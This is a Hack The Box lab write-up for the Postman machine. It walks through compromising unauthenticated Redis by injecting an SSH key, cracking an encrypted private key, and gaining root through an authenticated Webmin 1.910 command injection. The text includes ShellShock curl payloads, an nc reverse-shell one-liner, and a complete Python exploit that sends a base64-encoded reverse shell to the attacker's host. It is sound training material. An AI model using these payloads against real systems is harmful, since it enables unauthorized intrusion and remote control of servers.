---
layout: post
title:  "Postman Writeup - Hack The Box"
date:   2025-10-14
desc: ""
keywords: "HTB,eWPT,eWPTXv2,OSWE,Linux,Redis,SSH Key,Webmin,Scripting,Ruby code adaptation,Easy"
categories: [HTB]
tags: [HTB,eWPT,eWPTXv2,OSWE,Linux,Redis,SSH Key,Webmin,Scripting,Ruby code adaptation,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/postman_writeup/Postman.PNG" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

After a series of machines with **[Hack The Box's](https://www.hackthebox.com){:target="_blank"}** Windows OS, where I learned many new concepts, I'm now faced with the **Postman** box, which also tests me with a technology that I have heard a lot about but know nothing about. I had to do a lot of research and control my frustration tolerance because there were moments of great uncertainty, and I also got stuck at different stages of the **Engagement**. The machine is rated as **Easy** because there are some exploits and tools that automate different attacks and exploitation of vulnerabilities, so I decided to learn a little scripting to get much more out of the lab. Fun is guaranteed with this type of **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, so I just have to access the platform to spawn the lab and start my writeup.

<br /><br />
<img src="{{ site.img_path }}/postman_writeup/Postman_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As in every **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab, before starting the **Reconnaissance** phase, I verify with `ping` that I already have connectivity with the machine by sending a series of **ICMP** packets and waiting for them to be received correctly. Then, with the `whichSystem.py` tool, developed by **[hack4u](https://hack4u.io/){:target="_blank"}**, I obtain the installed **OS** that I'm going to have to compromise. Now it's time to rely on `nmap` to list the open ports (there is a very peculiar one - **10000**). I also use custom scripts written in **LUA** to obtain as much information as possible about the services available on each port found previously. Services such as **Redis** or **MiniServ** are accessible, which I don't remember finding in previous labs, and which will surely require a good amount of research and reading on my part. With the information collected, I find the possible **codename** of the machine (**bionic**), which can provide a first indication of whether **containers** are being implemented, but it seems that this is not the case in this lab. I focus on the **HTTP** protocol, which always represents the largest attack surface, and with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I disclose the technology stack behind the web application. I don't find much interesting information, the most relevant being the version of **JQuery**, which may be vulnerable to **[Prototype Pollution](https://portswigger.net/web-security/prototype-pollution){:target="_blank"}**. I find a **subdomain** on the page and immediately update my **hosts** configuration file, but I don't notice any differences on the web page when accessing it using the **IP** or the **subdomain**.

> **[Prototype pollution](https://portswigger.net/web-security/prototype-pollution){:target="_blank"}** is a **JavaScript vulnerability** that enables an attacker to add **arbitrary properties** to **global object prototypes**, which may then be inherited by user-defined objects. Although **prototype pollution** is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible.

```bash
ping -c 2 10.10.10.160
whichSystem.py 10.10.10.160
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.160 -oG allPorts
nmap -sCV -p22,80,6379,10000 10.10.10.160 -oN targeted
cat targeted
#     --> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
#     --> Apache httpd 2.4.29
# 6379/tcp  open  redis   Redis key-value store 4.0.9
# 10000/tcp open  http    MiniServ 1.910 (Webmin httpd)

cat ../nmap/targeted | grep http
whatweb http://10.10.10.160 http://10.10.10.160:10000

# http://10.10.10.160/
# http://10.10.10.160:10000/

nvim /etc/hosts
cat /etc/hosts | tail -n 1
cat /etc/hosts | tail -n 1 | awk 'NF{print $NF}' | xargs ping -c 1
whatweb http://10.10.10.160
```

<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/postman_writeup/Postman_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `nmap`, I perform an initial fingerprinting of the web server to find hidden files or directories. There is one with a very suggestive name (**upload**) to try to upload malicious content. When accessing from the browser, I notice that **directory listing** is enabled, but they are all images, which may have some hidden content using some **steganography** technique, but for now I'm not going to investigate further. With `wfuzz`, I perform a files and web directory discovery, but they are typical of a common web project whose content does not seem to provide any sensitive information leaks. With `redis-cli`, I **[connect to the Redis server](https://www.xtormin.com/pentesting-en-infraestructuras/servicios/redis-6379-tcp){:target="_blank"}** to perform **banner grabbing** on it and **[leak system information](https://routezero.security/2025/05/01/redis-cheat-sheet-for-penetration-testers/){:target="_blank"}**. I can even dump the **server configuration** (where I find the path where **Redis** appears to be installed), obtain the list of **keys**, and even set up a new one. Unfortunately, I can't find any attack vectors at the moment. I need to **try harder** and investigate further.

> **[Redis](https://monovm.com/blog/redis-port/){:target="_blank"}** is an **open-source**, **in-memory data structure store** used as a **database**, **cache**, and **message broker**. **Redis** uses a client-server model, where **clients** communicate with the **Redis server** through a **network socket**. The **Redis server** listens on a specific port for incoming connections from clients, and this port is known as the **Redis port**. By default, **Redis** listens on port **6379**, but this can be changed in the **configuration file**. The **Redis port** is an important configuration parameter, allowing clients to connect to the **Redis server** and perform various operations on the stored data.

```bash
nmap --script http-enum -p80 10.10.10.160 -oN webScan
# http://postman.htb/upload/

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.160/FUZZ

searchsploit redis

redis-cli -h 10.10.10.160
  INFO
# config_file:/etc/redis/redis.conf
  client list
  CONFIG GET *                                # [Dumps configuration]
# 12) "/var/log/redis/redis-server.log"
# 14) "/var/run/redis/redis-server.pid"
# 166) "/var/lib/redis"
  KEYS *                                      # [Lists all keys]
  CONFIG SET dir "/etc"                       # [Changes Redis settings]
  CONFIG GET dir
  CONFIG GET *
# 166) "/etc"
  CONFIG SET dir "/var/lib/redis"
  CONFIG GET *
# 166) "/var/lib/redis"
```

<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to leave **Redis** for now and focus on the other available port (**10000**), which happens to be **[Webmin](https://webmin.com/){:target="_blank"}**. When I try to access it with my browser, I'm informed that the web application is protected using **SSL** certificates. Once I use the **HTTPS** protocol to access **[Webmin](https://webmin.com/){:target="_blank"}**, I'm redirected to the authentication panel, where the first thing that catches my attention is the extension of the web application scripts (**.cgi**). I also confirm that the **cgi-bin** path exists, which makes me think of a **[ShellShock attack](https://blog.cloudflare.com/inside-shellshock/){:target="_blank"}** exploitation. After trying some default credentials that don't work on this server, I start testing **[ShellShock attacks](https://blog.cloudflare.com/inside-shellshock/){:target="_blank"}** without much success. With `searchsploit`, I find an exploit for this version of **Webmin**, but it requires authentication, and with `openssl`, I don't get much information by analyzing the server's **SSL certificate** either.

> **[Webmin](https://webmin.com/){:target="_blank"}** is a **web-based system administration tool** for Unix-like servers, and services. Using it, it is possible to configure **operating system internals**, such as **users**, **disk quotas**, **services** or **configuration files**, as well as modify, and control **open-source apps**, such as **BIND DNS Server**, **Apache HTTP Server**, **PHP**, **MySQL**, and many more.

```bash
# http://10.10.10.160:10000/
# https://postman.htb:10000/
# root:     admin:admin

# session_login.cgi
# https://postman.htb:10000/cgi-bin/

tcpdump -i tun0 icmp -n
curl -H "User-Agent: () { :; }; ping -c 1 10.10.14.2" https://10.10.10.160:10000/ -k
curl -H "User-Agent: () { :; }; whoami" https://10.10.10.160:10000/ -k
curl -H "User-Agent: () { :; }; echo; whoami" https://10.10.10.160:10000/ -k
curl -H "User-Agent: () { :; }; echo; echo; whoami" https://10.10.10.160:10000/ -k
curl -H "User-Agent: () { :; }; echo; echo; /usr/bin/whoami" https://10.10.10.160:10000/ -k

searchsploit webmin 1.910
searchsploit -x linux/remote/46984.rb

openssl s_client --connect 10.10.10.160:10000
```

<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After much research and reading of the various **Internet** resources related to **Redis** that I come across, I always find something interesting that gives me everything I need to list or exploit an unknown service on the **[HackTrick](https://book.hacktricks.wiki/en/){:target="_blank"}** page. The technique explained in great detail on this page would allow me to perform an **[SSH key injection](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=6379#ssh){:target="_blank"}** on the target system. Before carrying out the attack, I connect with `redis-cli` to find **directory paths** that can store **SSH keys** and find the one for **Redis**. The first step is to generate a pair of **SSH keys** with `ssh-keygen` and save the **public key** as a text file. The next step is to import the **public key** into **Redis** and finally save it as **authorized_keys** on the **Redis server**. Then I can set the correct permissions for my private key (**400** or **600**) to avoid errors due to have very open permissions, and in this way I manage to access the system with `ssh` with the **redis** user. Once the target system is engaged, I find very interesting information in the command history, and with the first enumeration commands I collect information that can help me **Escalate privileges**.

> **Attacker Machine**:

```bash
redis-cli -h 10.10.10.160
  CONFIG SET dir /root/.ssh
  CONFIG SET dir /redis/.ssh
  CONFIG SET dir /var/lib/redis/.ssh

ssh-keygen -t rsa
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > pub.txt
/bin/cat pub.txt | redis-cli -h 10.10.10.160 -x SET crackit

redis-cli -h 10.10.10.160
  CONFIG SET dir /var/lib/redis/.ssh
  CONFIG SET dbfilename "authorized_keys"
  SAVE

chmod 600 id_rsa.pub
ssh -i id_rsa redis@10.10.10.160
```

> **Victime Machine**:

```bash
whoami
hostname
hostname -I
export TERM=xterm

cat .bash_history

id
groups
sudo -l
cat /etc/passwd | grep 'sh$'

uname -a
lsb_release -a

find \-perm -4000 2>/dev/null
getcap / -r 2>/dev/null
```

<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I perform a recursive search for files and directories owned by the user **redis**, I find the **Redis** configuration file, but there is no sensitive information that helps me in my search for an attack vector for **Privilege escalation**. The other user I found in the **passwd** file, who had a **shell** assigned, is **matt**, and now when I perform the same recursive search, I'm able to list important files, such as a copy of an **SSH private key**. Unfortunately, it is protected by an encryption algorithm, so I have to resort to `ssh2john` to obtain the file **hash** so that I can try to crack it with `john` through a brute force attack using the **Rockyou** dictionary. The `john` tool succeeds to get me the password, but if I try to connect with `ssh` from my machine using the private key, the connection closes automatically. With a little lateral thinking and knowledge of bad practices, I **reuse the password** from the **id_rsa** key to pivot the user **matt** directly into the previously opened **SSH** session, so I can now access the first flag.

> **Victime Machine**:

```bash
find \-user redis 2>/dev/null
find \-user redis 2>/dev/null | grep -v proc
find \-user redis 2>/dev/null | grep -vE 'proc|cgroup'
find \-user redis 2>/dev/null | grep -vE 'proc|cgroup|user'

cat ./etc/redis/redis.conf
cat ./etc/redis/redis.conf | grep -v '^#.*'
cat ./etc/redis/redis.conf | grep -v '^#.*' | sed '/^\s*$/d'

find / \-user Matt 2>/dev/null
ls -l /opt/id_rsa.bak
ls -l /home/Matt/user.txt
cat /opt/id_rsa.bak
```

> **Attacker Machine**:

```bash
nvim id_rsa
cat id_rsa | head -n 7
locate ssh2john
ssh2john id_rsa > hash_idrsa
john -w=$(locate rockyou.txt)       [Tab]
john -w=/usr/share/wordlists/rockyou.txt hash_idrsa

ssh -i id_rsa matt@10.10.10.160
```

> **Victime Machine**:

```bash
su Matt
```

<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Following the line of taking advantage of the various bad practices of this machine, I investigate the command history but cannot access relevant information. I must **try harder** in this phase of enumerating the system, but I still cannot find any **attack vector**, **information leakage**, or **misconfiguration**, although when I list the background processes with `ps`, I remember the **Webmin** service. The credentials of the user **Matt** now allow me to access the **Dashboard**, and I also remember that there was an exploit, but it required authentication. Now it is very likely that I can execute commands as the user with maximum privileges.

> **Victime Machine**:

```bash
id
groups
cat .bash_history
# [Bad Practice] --> Recommendation:  ln -s -f /dev/null .bash_history
```

> **Attacker Machine**:

```bash
netstat -nat
ps -fawx

# https://postman.htb:10000/
# Matt:...      :)

searchsploit webmin 1.910
searchsploit -x linux/remote/46984.rb
# Webmin Package Updates Remote Command Execution
# can execute arbitrary commands with root privileges
```

<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To practice and get more out of this lab, I'm not going to use the **exploit** I just found, especially since it only works with **Metasploit**, and I don't usually use this automated tool on **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machines. It's time to create a custom script. I just need to understand the logic of the **exploit** I found with `searchsploit` to adapt it to mine, which will be developed with **Python**. After configuring the **Python** environment that allows me to install the libraries I'm going to use, such as **[pwntools](https://pypi.org/project/pwntools/){:target="_blank"}**, without security issues, the **authentication** fase begins. I just need to create the **request** that will be sent to the server with the correct **parameter names** and their corresponding **values**. The next step is to create a function that **checks** the **Webmin system version**. I encounter a restriction when trying to access the **sysinfo.cgi** program from an unknown **URL**, which I can solve thanks to **BurpSuite** by simply catching the requests sent to the server, then creating a **rule** that injects the **Referer** header with the **IP** value of the target machine.

```bash
nvim webmin_exploit.py
python3 webmin_exploit.py
pip3 install pwn

python3 -m venv .
./bin/pip3 install pwn
./bin/python3 webmin_exploit.py

./bin/python3 webmin_exploit.py

# https://postman.htb:10000/sysinfo.cgi
# Webmin has detected that the program https://postman.htb:10000/sysinfo.cgi was linked to from an unknown URL...

burpsuite &>/dev/null & disown
# Proxy --> Proxy settings --> Proxy --> HTTP match and replace rules --> [Referer: https://10.10.10.160:10000]
```

<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/postman_writeup/Postman_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to skip creating some functions that I don't think will be necessary, such as checking for package update priv, and focus on the **exploitation**. In the **exploit** source code, I find the “malicious” **request** that will be sent to the server with the data, which is **URL-encoded** and which I manage to decode with `php`. In the data that is sent, I can see where the **payload** is being injected, so I must return to my analysis of the code to understand how the malicious command is build together with the **payload** (which is also encoded in **Base64**). Finally, I finish setting up the **request** with the **parameters** I decoded with `php` (with their corresponding values), which carries my **payload** with the malicious test command in the vulnerable field. Although I still get the warning message about the **URL** (because I forgot to set up **BurpSuite** as a proxy), I don't get any output corresponding to my command either.

```bash
php --interactive
  $string = "acl%2Fapt&u=%20%7C%20#{payload}&ok_top=Update+Selected+Packages";
  echo urldecode($string);
# acl/apt&u= | #{payload}&ok_top=Update Selected Packages

nvim webmin_exploit.py
./bin/python3 webmin_exploit.py

./bin/python3 webmin_exploit.py
```

<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to update my **exploit**, first to use the victim machine's **IP** address instead of the **domain name**, and I'm also configuring a proxy on port **8080** where **BurpSuite** works, but I'm still not getting the command output. But before analyzing my exploit, thankfully I investigate the **data** sent in the **request** with **BurpSuite** because I notice the error, since for some reason one of the parameters and its corresponding value is not being sent. Just by changing the format of the **json**, which stores the **request data**, I succeed in achieving my goal of executing the command remotely. With the Python **re** library, I can clean up the response so that only the command output is displayed. Now I can try to obtain a **Reverse Shell**, after verifying connectivity with `ping`, using a **[PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** one-liner. I succeed in accessing the target machine, but in order for my **exploit** to be fully functional, I modify it so that once the **Reverse Shell** is obtained, it generates an **Interactive Shell**. I can now access the last flag and complete the **Postman** box **Engagement**.

> **Attacker Machine**:

```bash
# Use: main_url = "https://10.10.10.160:10000/"
./bin/python3 webmin_exploit.py
./bin/python3 webmin_exploit.py

./bin/python3 webmin_exploit.py
  l
  print(html.unescape(re.findall(r'<pre>(.*?)</pre>',r.text)))
  print(html.unescape(re.findall(r'<pre>(.*?)</pre>',r.text, re.DOTALL)))
  print(html.unescape(re.findall(r'<pre>(.*?)</pre>',r.text, re.DOTALL)[0]))
  print(html.unescape(re.findall(r'<pre>(.*?)</pre>',r.text, re.DOTALL)[0]).strip())

echo "ping -c 2 10.10.14.2" | tr -d '\n' | base64; echo
tcpdump -i tun0 icmp -n
nvim webmin_exploit.py
./bin/python3 webmin_exploit.py

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 443 >/tmp/f" | base64 -w 0; echo
nvim webmin_exploit.py
```

> **webmin_exploit.py**:

```python
#!/usr/bin/python3

from pwn import *
import pdb, urllib3, requests, html

def def_handler(sig,frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Global Variables
main_url = "https://10.10.10.160:10000/"
local_port = 443
proxy = {"https": "http://127.0.0.1:8080"}

def exploit():

    urllib3.disable_warnings()
    s = requests.session()
    s.verify = False

    headers = {'cookie' : 'testing=1'}
    post_data = {
        'page' : '',
        'user' : 'Matt',
        'pass' : 'c...8'
    }
    r = s.post(main_url + "session_login.cgi", data=post_data, headers=headers)

    post_data = [
        ('u' , 'acl/apt'),
        ('u' , ' | bash -c "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMiA0NDMgPi90bXAvZgo= | base64 -d | bash -i"'),
        ('ok_top' , 'Update Selected Packages')
    ]

    headers = {'Referer': 'https://10.10.10.160:10000/'}
    r = s.post(main_url + 'package-updates/update.cgi', data=post_data, headers=headers)
    #pdb.set_trace()
    print(html.unescape(re.findall(r'<pre>(.*?)</pre>',r.text, re.DOTALL)[0]).strip())

if __name__ == "__main__":

    try:
        threading.Thread(target=exploit, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(local_port, timeout=20).wait_for_connection()
    shell.interactive()
```

```bash
nc -nlvp 443
./bin/python3 webmin_exploit.py
```

<br/>
<img src="{{ site.img_path }}/postman_writeup/Postman_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/postman_writeup/Postman_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/postman_writeup/Postman_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> I can't remember the last time I was able to practice and improve my **scripting** skills, but thanks to this excellent and very entertaining **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** box, I was able to return to this very necessary facet that a **pentester** must perfect in order to not be tied to the **functioning of the exploits** used to exploit vulnerabilities. I don't think the machine was very **Easy** either, because there were many concepts involved that weren't so well known, although there are people with a lot of knowledge in the field who need greater challenges to consider a box **Hard** or **Insane**. I killed the **Postman** box, so now I can move on to the next one.

<br /><br />
<img src="{{ site.img_path }}/postman_writeup/Postman_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
